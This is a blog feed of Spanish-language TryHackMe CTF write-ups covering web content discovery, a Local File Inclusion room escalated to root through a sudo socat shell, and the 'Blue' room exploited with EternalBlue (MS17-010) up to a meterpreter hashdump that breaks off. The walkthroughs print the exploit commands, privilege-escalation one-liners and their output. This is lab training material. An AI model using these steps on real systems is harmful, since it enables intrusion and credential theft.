&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | &lt;span class=&quot;nb&quot;&gt;md5sum&lt;/span&gt;
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1406  100  1406    0     0   2301      0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:--  2297
f276b19aabcb4ae8cda4d22625c6735f  -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;manual-discovery---sitemapxml&quot;&gt;Manual Discovery - Sitemap.xml&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/discovery/sitemap.png&quot; alt=&quot;sitemap&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the path of the secret area that can be found in the sitemap.xml file?&lt;br /&gt;
/s3cr3t-area&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;manual-discovery---http-headers&quot;&gt;Manual Discovery - HTTP Headers&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl http://10.10.234.170 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 10.10.234.170:80...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 10.10.234.170 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.234.170&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET / HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 10.10.234.170
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.74.0
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Mark bundle as not supporting multiuse
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Server: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&amp;lt; Date: Thu, 18 Nov 2021 13:47:57 GMT
&amp;lt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
&amp;lt; Transfer-Encoding: chunked
&amp;lt; Connection: keep-alive
&amp;lt; X-FLAG: THM&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;xxxxxxxxxxx&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;What is the flag value from the X-FLAG header?&lt;br /&gt;
THM{HEADER_FLAG}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;manual-discovery---framework-stack&quot;&gt;Manual Discovery - Framework Stack&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/discovery/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the flag from the framework’s administration portal?&lt;br /&gt;
THM{CHANGE_DEFAULT_CREDENTIALS}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;osint---google-hacking--dorking&quot;&gt;OSINT - Google Hacking / Dorking&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Filter&lt;/th&gt;
      &lt;th&gt;Example&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;site&lt;/td&gt;
      &lt;td&gt;site:tryhackme.com&lt;/td&gt;
      &lt;td&gt;returns results only from the specified website address&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;inurl&lt;/td&gt;
      &lt;td&gt;inurl:admin&lt;/td&gt;
      &lt;td&gt;returns results that have the specified word in the URL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;filetype&lt;/td&gt;
      &lt;td&gt;filetype:pdf&lt;/td&gt;
      &lt;td&gt;returns results which are a particular file extension&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;intitle&lt;/td&gt;
      &lt;td&gt;intitle:admin&lt;/td&gt;
      &lt;td&gt;returns results that contain the specified word in the title&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;What Google dork operator can be used to only show results from a particular site&lt;br /&gt;
site:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;osint---wappalyzer&quot;&gt;OSINT - Wappalyzer&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Basicamente es una extención que permite identificar que tecnologias usa un sitio web&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;What online tool can be used to identify what technologies a website is running?&lt;br /&gt;
wappalyzer&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;osint---wayback-machine&quot;&gt;OSINT - Wayback Machine&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the website address for the Wayback Machine?&lt;br /&gt;
https://archive.org/web&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;osint---github&quot;&gt;OSINT - GitHub&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is Git?&lt;br /&gt;
version control system&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;osint---s3-buckets&quot;&gt;OSINT - S3 Buckets&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What URL format do Amazon S3 buckets end in?&lt;br /&gt;
.s3.amazonaws.com&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;automated-discovery&quot;&gt;Automated Discovery&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/discovery/gobuster.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the name of the directory beginning “/mo….” that was discovered?&lt;br /&gt;
/monthly&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the name of the log file that was discovered?&lt;br /&gt;
/development.log&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Gobuster" /><category term="Robots.txt" /><summary type="html">Conozca las diversas formas de descubrir contenido oculto o privado en un servidor web que podría generar nuevas vulnerabilidades.</summary></entry><entry><title type="html">tryhackme: LFI</title><link href="http://localhost:4000/LFI/" rel="alternate" type="text/html" title="tryhackme: LFI" /><published>2021-11-15T00:00:00-05:00</published><updated>2021-11-15T00:00:00-05:00</updated><id>http://localhost:4000/LFI</id><content type="html" xml:base="http://localhost:4000/LFI/">&lt;h1 id=&quot;local-file-inclusion&quot;&gt;Local File Inclusion&lt;/h1&gt;

&lt;p&gt;Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con 
este tipo de fallo (a diferencia de Remote File Inclusión &lt;em&gt;RFI&lt;/em&gt; que incluye archivos alojados en otros servidores).&lt;/p&gt;

&lt;p&gt;Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar 
funciones en PHP para incluir archivos.&lt;/p&gt;

&lt;h3 id=&quot;una-definicion-un-poco-menos-tecnica&quot;&gt;una definicion un poco menos tecnica&lt;/h3&gt;

&lt;p&gt;El ataque de inclusión de archivos locales es el que utiliza el que puede incluir cualquier archivo local, es decir, todos los 
archivos que están presentes en el servidor si el permiso es correcto en el archivo.&lt;/p&gt;

&lt;h2 id=&quot;qué-peligro-representa-esto-si-solo-se-incluyen-ficheros-que-estén-en-el-mismo-servidor&quot;&gt;¿Qué peligro representa esto si solo se incluyen ficheros que estén en el mismo servidor?&lt;/h2&gt;

&lt;p&gt;Un atacante podría modificar los parámetros de lo que se incluye, por ejemplo, podría indicarle al 
sitio web que se incluyan otros archivos que también están en el servidor, comprometiendo la seguridad del mismo por completo.&lt;/p&gt;

&lt;p&gt;El archivo más común en Unix que podemor verificar es &lt;em&gt;/etc/passwd&lt;/em&gt;, tal ruta, es el archivo de contraseñas en sistemas linux&lt;/p&gt;

&lt;h3 id=&quot;vamos-a-la-practica&quot;&gt;vamos a la practica&lt;/h3&gt;

&lt;p&gt;al visitar la ruta http://10.10.194.21, para este caso es la de nuestra maquina&lt;/p&gt;

&lt;p&gt;lo primero que vemos es una pagina de inicio, vemos un poco de teoria sobre &lt;em&gt;LFI&lt;/em&gt; y &lt;em&gt;RFI&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/lfi/home.png&quot; alt=&quot;pagina de inicio&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ahora vamos ver un articulo&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/lfi/url.png&quot; alt=&quot;url aritulo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;vemos la url y probamos, la idea es visualizar el archivo de contraseñas de linux&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/lfi/passwd.png&quot; alt=&quot;passwd lfi&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;encontramos-un-usuario-y-contraseña-nos-conectamos-por-ssh-y-buscamos-las-banderas&quot;&gt;Encontramos un usuario y contraseña, nos conectamos por SSH y buscamos las banderas&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh falconfeast@10.10.194.21
falconfeast@10.10.194.21&lt;span class=&quot;s1&quot;&gt;'s password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 16 00:54:02 IST 2021

  System load:  0.02              Processes:           85
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 68%               IP address for eth0: 10.10.194.21
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Tue Nov 16 00:52:53 2021 from 10.9.4.214
falconfeast@inclusion:~$ 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;encontramos la &lt;em&gt;flag&lt;/em&gt; y la leemos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;falconfeast@inclusion:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;articles  user.txt
falconfeast@inclusion:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
6x9xxx5x1x8xx7x4x7x9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ahora buscamos obtener privilegios &lt;em&gt;root&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;falconfeast@inclusion:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su

falconfeast@inclusion:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;falconfeast on inclusion:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User falconfeast may run the following commands on inclusion:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/socat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;el comando &lt;em&gt;sudo -l&lt;/em&gt; lo que hace es, enumerar los privilegios del usuario o verifica un mando&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;vemos que podemos usar &lt;em&gt;socat&lt;/em&gt; para elevar privilegios &lt;img src=&quot;https://gtfobins.github.io/gtfobins/socat/&quot; alt=&quot;aqui&quot; /&gt; podemos leer un poco
respecto a ello&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;falconfeast@inclusion:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/socat stdin &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;:/bin/sh
script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
Script started, file is /dev/null
root@inclusion:~# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ejecutamos &lt;em&gt;script /dev/null -c bash&lt;/em&gt; y luego &lt;em&gt;CTRL + Z&lt;/em&gt; para regresar a la &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@inclusion:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
xx96x1x4x4x4x5x5x9xx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;listo, somos usuario &lt;em&gt;root&lt;/em&gt; y tenemos la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="LFI" /><category term="Local File Inclusion" /><summary type="html">Un desafío LFI para principiantes</summary></entry><entry><title type="html">tryhackme: blue</title><link href="http://localhost:4000/blue/" rel="alternate" type="text/html" title="tryhackme: blue" /><published>2021-11-11T00:00:00-05:00</published><updated>2021-11-11T00:00:00-05:00</updated><id>http://localhost:4000/blue</id><content type="html" xml:base="http://localhost:4000/blue/">&lt;h3 id=&quot;iniciamos-conprobando-que-la-maquina-este-encendida&quot;&gt;Iniciamos conprobando que la maquina este encendida&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.31.159
PING 10.10.31.159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.31.159&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.31.159: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;187 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.31.159 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 186.669/186.669/186.669/0.000 ms
❯ settarget 10.10.31.159
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Comprobamos que &lt;em&gt;OS&lt;/em&gt; corre la maquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.31.159

10.10.31.159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 127&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ahora-si-a-realizar-un-primer-escaneo-de-puertos&quot;&gt;ahora si a realizar un primer escaneo de puertos&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.31.159 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-11 07:47 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Stats: 0:00:43 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 54.84% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 07:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:36 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Stats: 0:01:25 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 07:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:00 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.31.159
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 52538 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12992 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49153/tcp open  unknown

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;85.45 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;How many ports are open with a port number under 1000?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;vemos el resultado del escaneo anterior con la utilidad &lt;em&gt;extractPors&lt;/em&gt; y esta nos copia los puertos en la clipboard&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts allPorts
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.31.159
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 135,139,445,3389,49153
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Con los puertos copiados en la clipboard procedemos a realizar un escaneo con &lt;em&gt;script&lt;/em&gt; basicos de vulnerabildades de &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;ms17-010&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ahora ya sabemos que es vulnerable a &lt;em&gt;ethernalblue&lt;/em&gt;, buscamos un exploit manual en &lt;em&gt;google&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/blue/manual.png&quot; alt=&quot;exploit manual&quot; /&gt;&lt;/p&gt;

&lt;p&gt;procedemos a instalar la utilidad&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;comandos&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;el &lt;em&gt;script&lt;/em&gt; tiene una utilidad que nos confirma que la maquina es vulnerable a &lt;em&gt;ethernalblue&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bas&quot;&gt;❯ python3 eternal_checker.py 10.10.125.134
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos, la maquina no esta parchada contra esta vulnerabilidad, procedemos a explotarla
nos novemos al directorio &lt;em&gt;shellcode&lt;/em&gt; como indicaa la “guia” del &lt;em&gt;scritp&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/blue/shell_code.png&quot; alt=&quot;configuracion scrit&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ejecutamos con la configuración anterior&lt;/li&gt;
  &lt;li&gt;toca ejecutar el comando varias veces puesto que, se bloquea la maquina y/o problemas de &lt;em&gt;eternalblue&lt;/em&gt; (algo común)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python eternalblue_exploit7.py 10.10.125.134 shellcode/sc_all.bin
shellcode size: 2205
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;en otra consola ponemos nuestra ejecutamos el comando &lt;em&gt;listener_prep.sh&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;hashdump&quot;&gt;hashdump&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run post/windows/gather/hashdump

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; SESSION may not be compatible with this module:
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; missing Meterpreter features: stdapi_sys_process_set_term_size
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obtaining the boot key...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obtaining the user list and keys...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Decrypting user keys...
